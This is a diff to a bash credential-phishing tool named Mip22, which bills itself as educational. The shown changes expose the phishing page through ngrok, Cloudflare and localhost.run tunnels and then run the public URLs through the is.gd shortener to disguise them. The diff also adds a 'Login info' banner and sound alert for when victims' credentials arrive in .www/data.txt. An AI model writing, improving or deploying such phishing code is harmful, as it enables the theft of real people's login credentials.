@@ -105,7 +105,6 @@ RESETBG="$(printf '\e[0m\n')"
 
 
 
-
 # Directories
 if [[ ! -d ".host" ]]; then
 	mkdir -p ".host"
@@ -144,7 +143,7 @@ pid_kill() {
 
 header(){
 	
-	printf "${BLUE}"	
+    printf "${BLUE}"	
 	cat <<- EOF
 	
 ${BLUE}  ███╗   ███╗██╗███████╗███████╗██╗ ██████╗ ███╗   ██╗███████╗                        ${RED}     o
@@ -160,7 +159,7 @@ ${BLUE}  ██║██║╚██╔╝██║██╔═══╝ ██�
 ${BLUE}  ██║██║ ╚═╝ ██║██║     ╚██████╔╝███████║███████║██║██████╔╝███████╗███████╗███████║   dP   dP
 ${BLUE}  ═╝╚═╝     ╚═╝╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝╚═════╝ ╚══════╝╚══════╝╚══════╝   d888 d888 
 ${BLUE}                                                                                         
-        ${CYAN}Mip22 tool made for educational purpose only. 	${ORANGE}Version: 2.0  
+        ${CYAN}Mip22 tool made for educational purpose only. 	${ORANGE}Version: 3.0  
         ${CYAN}The author is not responsible for any malicious use of the program.
 		${CYAN}        Mip Created by ${ORANGE}makdosx ${CYAN}(https://github.com/makdosx) ${WHITE}
 	
@@ -171,6 +170,25 @@ ${BLUE}
 }
 
 
+
+log_info(){
+	
+	bold=$(tput bold)
+    normal=$(tput sgr0)
+	
+    printf "${GREEN}"	
+	cat <<- EOF
+
+$bold                            _       _                
+$bold  |   _   _  o ._    o ._ _|_ _    |_ _      ._   _| 
+$bold  |_ (_) (_| | | |   | | | | (_)   | (_) |_| | | (_| 
+$bold          _|                                     
+
+	
+	EOF
+
+	printf "${RESETBG}"	
+}
 
 
 
@@ -280,9 +298,12 @@ credentials() {
 		sleep 0.75
 		
 		if [[ -e ".www/data.txt" ]]; then
-			echo -e "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Login info Found !"
+		    notice_login
+		    echo -e "\n"
+		    log_info
+		    #echo -e "\n\n \033[31;5;7m Login info Found! \033[37m"
+		    #echo -e "${RESETBG}"
 			get_creds
-			notice_login
 			rm -rf .www/data.txt
 		fi
 		
@@ -310,9 +331,12 @@ credentials_manual() {
 		sleep 0.75
    
 		if [[ -e ".www/data.txt" ]]; then
-			echo -e "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Login info Found !"
-			get_creds_manual
 			notice_login
+		    echo -e "\n"
+		    log_info
+		    #echo -e "\n\n \033[31;5;7m Login info Found! \033[37m"
+		    #echo -e "${RESETBG}"
+			get_creds_manual
 			rm -rf .www/data.txt
 		fi
 		
@@ -442,11 +466,17 @@ ngrok_start() {
     fi
 
 	{ sleep 9; clear; header; }
+	
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
 	ngrok_url1=${ngrok_url#https://}
+	
+    url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$ngrok_url1")
+	
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$ngrok_url1"
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$ngrok_url"
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$ngrok_url1"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
+	
 	credentials
 }
 
@@ -468,11 +498,17 @@ ngrok_start_manual() {
     fi
 
 	{ sleep 9; clear; header; }
+	
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
 	ngrok_url1=${ngrok_url#https://}
+	
+	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$ngrok_url1")
+	
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$ngrok_url1"
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$ngrok_url"
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$ngrok_url1"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
+	
 	credentials_manual
 }
 
@@ -498,9 +534,14 @@ cloudflared_start() {
 	
 	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
 	cldflr_url1=${cldflr_url#https://}
+	
+	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")
+	
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$cldflr_url1"
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$cldflr_url"
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$cldflr_url1"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
+	
 	credentials
 }
 
@@ -525,9 +566,14 @@ cloudflared_start_manual() {
 	
 	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
 	cldflr_url1=${cldflr_url#https://}
+	
+	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")
+	
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$cldflr_url1"
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$cldflr_url"
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$cldflr_url1"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
+	
 	credentials_manual
 }
 
@@ -549,11 +595,17 @@ localhostrun_start() {
     fi
 
 	{ sleep 9; clear; header; }
+	
 	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".tunnels_log/.localrun.log")
 	localrun_url1=${localrun_url#https://}
+	
+	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")
+	
     echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$localrun_url1"
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL https(s) : ${GREEN}$localrun_url"
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$localrun_url1"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
+	
 	credentials
 }
 
@@ -573,11 +625,17 @@ localhostrun_start_manual() {
     fi
 
 	{ sleep 9; clear; header; }
+	
 	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".tunnels_log/.localrun.log")
 	localrun_url1=${localrun_url#https://}
+	
+	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")
+	
     echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$localrun_url1"
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL https(s) : ${GREEN}$localrun_url"
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$localrun_url1"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
+	
 	credentials_manual
 }
 
@@ -672,7 +730,6 @@ tunnel_manual() {
 	esac
 
 }
-
 
 
 
@@ -775,10 +832,6 @@ play_music() {
 
 notice_login()
 {
-xterm -e nohup mpv .notifications/find_login.mp3 > /dev/null 2>&1
-sleep 3
-xterm -e nohup mpv .notifications/find_login.mp3 > /dev/null 2>&1
-sleep 3
 xterm -e nohup mpv .notifications/find_login.mp3 > /dev/null 2>&1
 }
 
